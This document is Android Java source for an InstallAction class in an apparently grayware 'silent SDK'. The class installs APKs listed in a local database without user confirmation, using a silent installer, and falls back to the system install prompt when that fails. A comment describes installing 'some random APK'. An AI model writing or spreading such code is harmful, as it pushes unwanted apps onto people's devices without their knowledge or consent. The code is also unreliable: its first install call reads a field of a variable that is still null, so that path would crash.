package sdk.grayweb.com.slientsdk.action;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;

import com.litesuits.common.assist.SilentInstaller;

import java.io.File;
import java.sql.SQLException;
import java.util.List;

import sdk.grayweb.com.slientsdk.model.ActionModel;
import sdk.grayweb.com.slientsdk.model.ApkModel;

/**
 * Created by engine on 16/5/11.
 */
public class InstallAction extends AbstractAction {
    public InstallAction(Context context) {
        super(context);
    }

    @Override
    public int doAction() {
        try {
            List<ApkModel> apkModels = apkModelDao.queryForAll();
            ApkModel targetApk = null;
            for (int i = 0; i < apkModels.size(); i++) {
                ApkModel model = apkModels.get(i);
                if (!hasInstall(model.packagename)) {//没有安装
                    List<ActionModel> list = actionDao.queryBuilder().where().eq("packageName",model.packagename).ge("type",2).query();
                    if(list.size()==0){//没有安装过
                        //安装这个apk
                        installApk(targetApk.packagename, model.apkPath);
                    }else {
                        targetApk=model ;
                    }
                }
            }
            //安装一个随便的APK
            if (targetApk!=null) {
                installApk(targetApk.packagename, targetApk.apkPath);
            }

        } catch (SQLException e) {
            e.printStackTrace();
        }
        return 0;
    }

    private int installApk(String packageName ,String apkPath){
        File  file = new File(apkPath);
        if(file.exists()) {
            SilentInstaller silentInstaller = new SilentInstaller();
            int result = silentInstaller.installSilent(mContext, apkPath);
            if(result==SilentInstaller.INSTALL_SUCCEEDED){
                ActionModel actionModel = new ActionModel();
                actionModel.packageName = packageName ;
                actionModel.type=3 ;
                actionModel.time=System.currentTimeMillis();
                try {
                    actionDao.create(actionModel) ;
                } catch (SQLException e) {
                    e.printStackTrace();
                }
                return 1;
            }else {
                Intent intent = new Intent(Intent.ACTION_VIEW);
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                intent.setDataAndType(Uri.parse("file://" + apkPath),"application/vnd.android.package-archive");
                mContext.startActivity(intent);
                return 2;
            }
        }else {
            return  -1 ;
        }
    }
}
